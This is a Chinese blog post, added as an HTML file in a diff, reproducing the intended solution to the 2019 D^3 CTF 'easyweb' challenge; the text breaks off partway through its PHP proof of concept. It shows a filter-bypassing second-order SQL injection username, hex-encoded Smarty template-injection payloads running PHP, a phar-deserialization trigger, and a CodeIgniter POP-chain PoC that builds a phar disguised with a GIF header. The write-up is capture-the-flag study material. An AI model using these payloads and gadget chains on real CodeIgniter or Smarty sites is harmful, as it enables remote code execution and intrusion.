@@ -1,0 +1,187 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="ctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 D^3 CTF-easyweb预期解复现 | Somnus's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期"><span class="toc-number">2.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预期"><span class="toc-number">3.</span> <span class="toc-text">预期</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smarty-phar反序列化"><span class="toc-number">3.1.</span> <span class="toc-text">smarty phar反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CI-POP"><span class="toc-number">3.2.</span> <span class="toc-text">CI POP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">3.3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE步骤"><span class="toc-number">3.4.</span> <span class="toc-text">RCE步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最终效果"><span class="toc-number">3.5.</span> <span class="toc-text">最终效果</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">93</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">17</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">27</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="https://glotozz.github.io/" target="_blank" rel="noopener">glotozz</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a><a class="author-info-links__name text-center" href="https://www.virtua1.cn/" target="_blank" rel="noopener">Virtua1</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 D^3 CTF-easyweb预期解复现</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-12</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>Smarty php流 =&gt; phar反序列化 =&gt; CI POP链 =&gt;任意文件包含<a id="more"></a></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码拿到手后，简单分析就可以看出是一个<strong>CI</strong>框架，<strong>/appliaction/config/routes.php</strong>中可以看出程序的在<code>user/login</code>这个路由，那么我们就从这里开始审计起：<strong>/appliaction/controllers/User</strong>，进行一番测试后，发现register和login路由都对单引号存在<strong>CI</strong>框架本身的转义处理，所以不存在注入点。随意注册个账号登陆后，可以来到index路由</p>
+<p>登陆后：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;session-&gt;has_userdata(<span class="string">'userId'</span>)) &#123;</span><br><span class="line">	$userView = <span class="keyword">$this</span>-&gt;Render_model-&gt;get_view(<span class="keyword">$this</span>-&gt;session-&gt;userId);</span><br><span class="line">	$prouserView = <span class="string">'data:,'</span> . $userView;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;username = <span class="keyword">array</span>(<span class="string">'username'</span> =&gt; <span class="keyword">$this</span>-&gt;getUsername(<span class="keyword">$this</span>-&gt;session-&gt;userId));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;ci_smarty-&gt;assign(<span class="string">'username'</span>, <span class="keyword">$this</span>-&gt;username);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;ci_smarty-&gt;display($prouserView);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>get_view</code>：<strong>/application/models/Render_model.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_view</span><span class="params">($userId)</span></span>&#123;</span><br><span class="line">    $res = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT username FROM userTable WHERE userId='$userId'"</span>)-&gt;result();</span><br><span class="line">	<span class="keyword">if</span>($res)&#123;</span><br><span class="line">		$username = $res[<span class="number">0</span>]-&gt;username;</span><br><span class="line">		$username = <span class="keyword">$this</span>-&gt;sql_safe($username);</span><br><span class="line">		$username = <span class="keyword">$this</span>-&gt;safe_render($username);</span><br><span class="line">		$userView = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT userView FROM userRender WHERE username='$username'"</span>)-&gt;result();</span><br><span class="line">		$userView = $userView[<span class="number">0</span>]-&gt;userView;</span><br><span class="line">		<span class="keyword">return</span> $userView;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据<code>$userId</code>进行sql查询，查询出的<code>username</code>直接拼接到<code>$this-&gt;db-&gt;query(&quot;SELECT userView FROM userRender WHERE username=&#39;$username&#39;&quot;)</code>，很容易看出存在这里存在<strong>二次注入</strong>点</p>
+<p>不过有两处过滤：<code>sql_safe</code>和<code>safe_render</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">safe_render</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	$username = str_replace(<span class="keyword">array</span>(<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>),<span class="string">''</span>,$username);</span><br><span class="line">	<span class="keyword">return</span> $username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)/i'</span>,$sql))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> $sql;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sql_safe</code>过滤了关键字，<code>safe_render</code>则是将关键字<code>{}</code>替换为空，不过这里因为处理的顺序是先<code>sql_safe</code>检测再被<code>safe_render</code>处理，所以可以在sql关键字中加入<code>{}</code>绕过<code>sql_safe</code>的检测过滤，例如：<code>s{elect</code></p>
+<p>因此注入的流程是：</p>
+<p>注册用户名：<code>&#39; u{nion s{elect 1#</code> =&gt; 登陆 =&gt; 访问<strong>/index</strong>路由触发二次注入</p>
+<p>那么，注入后我们便可以控制查询的<strong>用户名字段</strong>，然后后台将查询出的用户名拼接上<code>data:,</code>形成<strong>data协议</strong>后进入<strong>smarty</strong>框架的<strong>display</strong>函数中，很容易看出这里可能存在<strong>模板注入</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$prouserView = <span class="string">'data:,'</span> . $userView;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ci_smarty-&gt;display($prouserView);</span><br></pre></td></tr></table></figure>
+
+<p>比如我们要查询<strong>smarty</strong>的版本号：<code></code>，这里的花括号我们可以利用sql的十六进制编码来绕过<code>safe_render</code>的过滤</p>
+<p>注册：<code>&#39; u{nion s{elect 0x7b7b24736d617274792e76657273696f6e7d7d#</code>，登陆后触发二次注入，模板渲染</p>
+<p><img src="../../../../img/d3/47.png" alt=""></p>
+<p>到这里开始就产生两种解法，先分析一下比较简单的非预期</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>由于出题师傅采用了兼容低版本的<strong>SmartyBC</strong>引擎，在<strong>Smarty3</strong>的官方手册有以下描述：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smarty已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span><br></pre></td></tr></table></figure>
+
+<p>Smarty支持<code>php</code>标签执行被包裹在其中的php指令，我们就可以利用这点来进行最简单的rce</p>
+<p>例如执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;php&#125;&#125;phpinfo();&#123;&#123;/php&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>，我们注册一个<code>&#39; u{nion s{elect 0x7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d #</code>，登陆后，触发二次注入，渲染，成功执行</p>
+<p><img src="../../../../img/d3/48.png" alt=""></p>
+<p>但是这只是出题师傅的失误。拿到flag后，会发现出题师傅的本意是要我们构造一条POP链</p>
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>首先是那个被我们遗忘的文件上传：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session-&gt;has_userdata(<span class="string">'userId'</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'error'</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$filename = $_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>];</span><br><span class="line">			$filename = str_replace(<span class="string">'..'</span>,<span class="string">''</span>,$filename);</span><br><span class="line">			$uploadPath = <span class="string">'/tmp/'</span> . <span class="keyword">$this</span>-&gt;session-&gt;userId . <span class="string">'/'</span>;</span><br><span class="line">			<span class="keyword">if</span>(substr($filename,<span class="number">0</span>,<span class="number">1</span>) === <span class="string">'.'</span>)&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Error: file type is not allowed');&lt;/script&gt;&lt;script&gt;history.back();&lt;/script&gt;"</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$filepath = <span class="string">'/tmp/'</span> . <span class="keyword">$this</span>-&gt;session-&gt;userId . <span class="string">'/'</span> . $filename;</span><br><span class="line">				move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>],$uploadPath . $filename);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('file store in $filepath')&lt;/script&gt;&lt;script&gt;history.back();&lt;/script&gt;"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以上传任意文件，只不过只能上传到<code>/tmp</code>目录下，如果可以配合<strong>文件包含</strong>或者<strong>phar反序列化</strong>就可以加以利用。这就是出题人的意图：<strong>smarty phar反序列化</strong>  =&gt;  <strong>CI框架POP链文件包含</strong> =&gt; <strong>RCE</strong></p>
+<h4 id="smarty-phar反序列化"><a href="#smarty-phar反序列化" class="headerlink" title="smarty phar反序列化"></a>smarty phar反序列化</h4><p>smarty框架咱也不是很懂，也只能开个xdebug跟着wp简单走一走逻辑</p>
+<p>首先，在<strong>User.php</strong>添加一条路由<strong>test</strong>：</p>
+<p><img src="../../../../img/d3/49.png" alt=""></p>
+<p>看看在data协议下的处理流程</p>
+<p><img src="../../../../img/d3/50.png" alt=""></p>
+<p>这里调用了<code>createTemplate</code>函数，从函数名就可以看出，这是我们创建模板的地方，跟进该函数，重点关注我们传入的<code>$template</code>参数</p>
+<p><img src="../../../../img/d3/51.png" alt=""></p>
+<p><img src="../../../../img/d3/52.png" alt=""></p>
+<p>跟到<code>_getTemplateId</code>函数后，发现我们传入的模板参数<code>$template</code>，拼接上模板目录生成了字符串作为<code>$templateId</code></p>
+<p><img src="../../../../img/d3/53.png" alt=""></p>
+<p><img src="../../../../img/d3/54.png" alt=""></p>
+<p>这里实例化了一个对象<code>public $template_class = &#39;Smarty_Internal_Template&#39;</code></p>
+<p><img src="../../../../img/d3/86.png" alt=""></p>
+<p>跟进这个类，首先在构造方法<code>__construct</code>中设置了很多属性，还是把目光重点放在携带我们模板字符串<code>$template_source</code></p>
+<p><img src="../../../../img/d3/55.png" alt=""></p>
+<p>然后调用了<code>Smarty_Template_Source</code>的<code>load</code>方法，继续跟进</p>
+<p><img src="../../../../img/d3/56.png" alt=""></p>
+<p>在<code>load</code>方法中，采用了正则匹配，匹配了<code>$type</code>和<code>$name</code>，分别对应了<strong>协议名</strong>：<strong>data</strong>和<strong>协议内容</strong></p>
+<p>然后进入<code>Smarty_Template_Source</code>类中</p>
+<p><img src="../../../../img/d3/57.png" alt=""></p>
+<p>可以看到，该类的构建方法中，调用了<code>Smarty_Resource</code>类的<code>load</code>方法对参数<code>$type</code>即协议类型<code>data</code>进行了处理</p>
+<p><img src="../../../../img/d3/58.png" alt=""></p>
+<p>在这里进行了多次判断，是否是缓存以及是否注册以后的模板等，红框的地方是对流的判断</p>
+<p>首先通过<code>stream_get_wrappers</code>得到了smarty支持的所有流类型</p>
+<p><img src="../../../../img/d3/59.png" alt=""></p>
+<p>在smarty文档中提到支持流的方式去获取模板</p>
+<p><img src="../../../../img/d3/60.png" alt=""></p>
+<p>判断我们流类型参数<code>$type</code>是否在这个列表中，如果在则实例化<code>Smarty_Internal_Resource_Stream</code>类</p>
+<p>然后调用了该类的<code>populate</code>方法</p>
+<p><img src="../../../../img/d3/61.png" alt=""></p>
+<p>首先将我们的协议转换为<code>data://</code>，再调用<code>getContent</code>函数</p>
+<p><img src="../../../../img/d3/62.png" alt=""></p>
+<p>通过<code>fopen</code>模板字符串</p>
+<p><img src="../../../../img/d3/63.png" alt=""></p>
+<p>最后获取的模板字符串，即：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;php&#125;&#125;phpinfo();&#123;&#123;/php&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/d3/64.png" alt=""></p>
+<p>简单总结一下：</p>
+<p><code>Smarty_Template_Source::load()</code>将我们的输入的模板字符串分成<strong>协议名</strong>和<strong>协议内容</strong>两部分</p>
+<p><code>Smarty_Template_Source::load()</code>判断是输入的协议类型是否支持</p>
+<p><code>Smarty_Internal_Resource_Stream::populate()</code>对支持的流类型转化为<code>://</code>的形式拼接上协议内容后通过<code>fopen</code>获取模板字符串</p>
+<p>既然最后通过<code>fopen</code>处理协议，那么如果替换成<code>phar</code>协议是否能触发phar反序列化呢，换成：</p>
+<p><img src="../../../../img/d3/65.png" alt=""></p>
+<p>继续跟一下</p>
+<p><img src="../../../../img/d3/66.png" alt=""></p>
+<p><img src="../../../../img/d3/67.png" alt=""></p>
+<p>因为phar符合条件，所以还是会触发<code>Smarty_Internal_Resource_Stream ::populate()</code>，最后变成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(<span class="string">"phar:///etc/passwd"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但是用<code>fopen</code>来触发phar反序列化，对应php.ini中的<strong>phar.readonly</strong>值必须为<strong>false</strong>，而默认为<strong>true</strong>，在默认环境下，是无法通过<code>fopen</code>来触发的</p>
+<p>所以还得另寻他法</p>
+<p>我们再换成php协议：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;ci_smarty-&gt;display(<span class="string">'php:phar:///etc/passwd'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>按理来说php是支持的协议，应该也会进入<code>Smarty_Internal_Resource_Stream</code>，但是发现在进入之前，进入了一个<code>sysplugins</code>的处理</p>
+<p><img src="../../../../img/d3/68.png" alt=""></p>
+<p>这是因为<code>sysplugins[&#39;php&#39;]</code>存在：</p>
+<p><img src="../../../../img/d3/69.png" alt=""></p>
+<p>所以这里返回了<code>smarty_internal_resource_php.php</code>文件中定义的类：<code>Smarty_Internal_Resource_Php</code>，那么接下来就是调用了这个类的<code>populate</code>方法</p>
+<p><img src="../../../../img/d3/71.png" alt=""></p>
+<p>首先调用了<code>buildFilePath</code>函数，跟进该函数：</p>
+<p><img src="../../../../img/d3/70.png" alt=""></p>
+<p>发现了<code>is_file</code>函数对<code>$path</code>参数进行了处理，<code>is_file</code>函数触发phar反序列化是没有配置限制的，所以我们可以通过控制<code>$path</code>参数进行phar反序列化</p>
+<p>因为这里我本地环境是<strong>windows</strong>，所以导致<code>buildFilePath</code>函数在</p>
+<p><img src="../../../../img/d3/73.png" alt=""></p>
+<p>把<code>phar:///tmp/xxxx/xx.phar</code>中的<code>/</code>都替换成了<code>DIRECTORY_SEPARATOR = &#39;\&#39;</code></p>
+<p>然后<code>$path</code>经过<code>_realpath</code>的处理</p>
+<p><img src="../../../../img/d3/72.png" alt=""></p>
+<p>可以看到<code>$path</code>经过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = getcwd() . DIRECTORY_SEPARATOR . $path; <span class="comment">//$path: "phar:\\\tmp\xxx\xxx"</span></span><br></pre></td></tr></table></figure>
+
+<p>最终返回的带绝对路径的<code>$path</code>参数，如果是linux环境下，<code>DIRECTORY_SEPARATOR = &#39;/&#39;</code></p>
+<p>传入<code>_realpath</code>的<code>$path</code>参数就为<code>phar:///tmp/xxx/xxx</code></p>
+<p>测试一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_realpath</span><span class="params">($path, $realpath = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _realpath(<span class="string">'phar:///tmp/xxx/xxx'</span>,<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就解释了官方wp中为什么是原样返回了</p>
+<p>最终触发phar反序列化的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;include file=&quot;php:phar:///tmp/xxx/xxx.phar&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="CI-POP"><a href="#CI-POP" class="headerlink" title="CI POP"></a>CI POP</h4><p>全局搜索<code>__destruct</code></p>
+<p><strong>Cache_redis</strong>类</p>
+<p><img src="../../../../img/d3/75.png" alt=""></p>
+<p>当<code>$hits-&gt;_redis</code>为<code>true</code>时可以调用任意类的<code>close</code>方法</p>
+<p>全局搜索<code>close</code>方法</p>
+<p><img src="../../../../img/d3/77.png" alt=""></p>
+<p><strong>Session_database_driver</strong>类可以利用</p>
+<p><img src="../../../../img/d3/76.png" alt=""></p>
+<p>当<code>$this-&gt;_lock</code>为<code>true</code>时可以调用<code>_release_lock</code>方法</p>
+<p><img src="../../../../img/d3/78.png" alt=""></p>
+<p><code>$this-&gt;_lock</code>为<code>true</code>，<code>$this-&gt;_platform = &quot;mysql&quot;</code>时，触发任意类的<code>query</code>方法</p>
+<p>全局搜索<code>query</code>方法，只有在<strong>CI_DB_driver</strong>这个抽象类中有定义</p>
+<p><img src="../../../../img/d3/79.png" alt=""></p>
+<p><code>$sql</code>不为空，<code>!is_bool($return_object)</code>返回<code>true</code>，进入<code>is_write_type</code>函数</p>
+<p><img src="../../../../img/d3/80.png" alt=""></p>
+<p>我们前面传入的<code>$sql</code>开头为<code>SELECT</code>，不满足正则，返回<code>false</code>，则<code>$return_object</code>返回<code>true</code></p>
+<p>接着往下执行</p>
+<p><img src="../../../../img/d3/81.png" alt=""></p>
+<p>发现可以调用<code>load_rdriver</code>函数，<code>$this-&gt;cache_on</code>可控，<code>$return_object</code>我们刚才分析已经返回了<code>true</code>，只剩<code>_cache_init</code>函数，跟进</p>
+<p><img src="../../../../img/d3/82.png" alt=""></p>
+<p>这个函数最终都只会返回<code>true</code>，不影响</p>
+<p>那么继续跟进<code>load_rdriver</code>函数</p>
+<p><img src="../../../../img/d3/83.png" alt=""></p>
+<p><code>$this-&gt;dbdriver</code>可控，因此我们可以包含任意路径下，后缀为<strong>_result.php</strong>的文件</p>
+<p>最后我们只需要随便找一个继承<strong>CI_DB_driver</strong>的类即可</p>
+<p>流程图：</p>
+<p><img src="../../../../img/d3/84.png" alt=""></p>
+<p>结合之前文件上传可以上传任意文件，并且绝对路径已经，我们就可以包含任意文件进行RCE</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Cache_redis</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $_redis;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($_redis=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_redis = $_redis;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_Session_database_driver</span> <span class="keyword">extends</span> <span class="title">CI_Session_driver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $_platform = <span class="string">"mysql"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($db=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::__construct($db);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">CI_Session_driver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $_lock = <span class="keyword">true</span>;</span><br><span class="line">	<span class="keyword">protected</span> $_db;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($db=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_db = $db;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">CI_DB_driver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $cache_on = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_DB</span> <span class="keyword">extends</span> <span class="title">CI_DB_driver</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CI_DB_mysqli_driver</span> <span class="keyword">extends</span> <span class="title">CI_DB</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> $dbdriver = <span class="string">"../../../../../../tmp/303175f9437d5145afdb341a6236bf2e/somnus"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> CI_Cache_redis(<span class="keyword">new</span> CI_Session_database_driver(<span class="keyword">new</span> CI_DB_mysqli_driver()));</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($redis));</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"easyweb.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($redis); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span 